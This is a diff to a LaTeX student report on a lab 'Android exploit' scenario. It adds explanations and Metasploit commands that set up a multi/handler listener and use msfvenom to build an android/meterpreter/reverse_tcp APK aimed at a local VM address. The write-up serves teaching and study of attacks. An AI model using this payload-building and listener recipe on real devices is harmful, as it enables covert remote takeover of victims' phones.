@@ -25,6 +25,7 @@
     urlcolor=RoyalBlue,
     citecolor=RoyalBlue,
 }
+%\usepackage{fancyvrb}
 \begin{document}
 \linespread{1.5}
 \author{Affaan Muhammad - 33016763\\Joshua Esterhuizen - 30285976}
@@ -572,8 +573,12 @@ GIFs on the Blog were sourced from \url{https://tenor.com/}\\\\
 Additionally, the screenshots taken were from VMs we implemented in VirtualBox and other images for the headers were sourced from Google Images.
 \chapter{Scenario 1: Android exploit}
 \label{sec:sec1}
+The scenario is described as follows:
+\begin{displayquote}
+\textit{A person (that will be known as the victim in further discussions), opens a SMS received on their mobile device. This SMS has a malicious link embedded in it, or has a link that redirects to a malicious site. The link automatically downloads and runs an Android application package also known in other terms as an APK file. This APK file is what the Android Operating System uses to install applications. This malicious Application, once installed gives the Hacker (known as a perpetrator in an attack) full control over the deceive to outside parties, including the perpetrator. From here on out, the perpetrator has the victim in the palm of their hands, and can do what every they like to the device as well as carry out further attacks against the victim.}
+\end{displayquote}
 Here are the steps taken to exploit the Android virtual machine.\\\\
-Step 1: Open up the Metasploit console in Kali Linux by running the command below:
+Step 1: Open up the Metasploit console in Kali Linux by running the following command below:
 \begin{minted}
 [
 frame=lines,
@@ -601,21 +606,7 @@ breaksymbolleft=\carriagereturn
 {Shell}
 use exploit/multi/handler
 \end{minted}
-
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-use exploit/multi/handler
-\end{minted}
-
+The Multi Handler command launches a stub that runs outside the Framework. This command launches a payload that is specific to our specification.\cite{os1}
 \begin{minted}
 [
 frame=lines,
@@ -629,7 +620,7 @@ breaksymbolleft=\carriagereturn
 {Shell}
 search android/meterpreter
 \end{minted}
-
+Meterpreter is a tool that is part of the Metasploit Framework which allows you to take advantage of as well as find vulnerabilities in a system. This penetration testing tool can easily take hold of victim's resources as needed. Meterpreter utilises an in-memory injection which writes nothing to disk. This allows for the exploit to run without being detected by normal means. A new process is not created, rather it injects itself into a compromised process. For this reason also the forensic footprint left behind by the Meterpreter is limited.\cite{hypr, sdo}
 \begin{minted}
 [
 frame=lines,
@@ -643,7 +634,9 @@ breaksymbolleft=\carriagereturn
 {Shell}
 set payload android/meterpreter/reverse_tcp
 \end{minted}
-
+When the host initiates a connection, that is called a \textit{forward connection}. However, when the opposite is done, a server initiates the connection to a host, then it is called a reverse connection.
+Firewalls work on the basic principle of blocking all incoming connection. So all incoming connections (reverse connections) are blocked by the firewall. However, if a host initiates a connection (forward connection) it is allowed and the return for the connection initiated by the host will be permitted.
+Reverse\_tcp is basically instead of the attacker initiating the connection which will obviously blocked by the firewall instead, the device initiates the connection to the attacker, which will be allowed by the firewall and the attacker then take control of the device and pass commands. It is a type of reverse shell.\cite{zain}
 \begin{minted}
 [
 frame=lines,
@@ -657,7 +650,7 @@ breaksymbolleft=\carriagereturn
 {Shell}
 show options
 \end{minted}
-
+The above command shows the current options for the payload. These can then be changed as shown below.
 \begin{minted}
 [
 frame=lines,
@@ -671,7 +664,7 @@ breaksymbolleft=\carriagereturn
 {Shell}
 set LHOST <ip_address>
 \end{minted}
-
+The above command sets the IP address that will become a \textit{Listener}, in other words which IP address all the communication from the victim will be forwarded to.
 \begin{minted}
 [
 frame=lines,
@@ -685,7 +678,7 @@ breaksymbolleft=\carriagereturn
 {Shell}
 set LPORT <port_number>
 \end{minted}
-
+The above command changes the option of which port the \textit{Listener} should receive information. This is usually an open port that is not being used by any other process or service.
 \begin{minted}
 [
 frame=lines,
@@ -699,22 +692,20 @@ breaksymbolleft=\carriagereturn
 {Shell}
 exploit
 \end{minted}
-
-% \begin{minted}
-% [
-% frame=lines,
-% framesep=2mm,
-% baselinestretch=1.2,
-% bgcolor=LightBlue,
-% fontsize=\footnotesize,
-% breaklines,
-% breaksymbolleft=\carriagereturn
-% ]
-% {Shell}
-% msfvenom –p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /root/filename.apk
-% \end{minted}
-
-
+This aforementioned command begins the exploit and the \textit{Listener} will listen to any incoming responses from the victim. This is usually after the victim installs the malicious APK file and opens it. This is discussed further with the command listed below.
+\begin{minted}
+[
+frame=lines,
+framesep=2mm,
+baselinestretch=1.2,
+bgcolor=LightBlue,
+fontsize=\footnotesize,
+breaklines,
+breaksymbolleft=\carriagereturn
+]
+{Shell}
+msfvenom –p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /root/filename.apk
+\end{minted}
 \chapter{Scenario 2: Windows exploit}
 \chapter{Additional readings and miscellaneous information}
 \url{https://citizenlab.ca/}
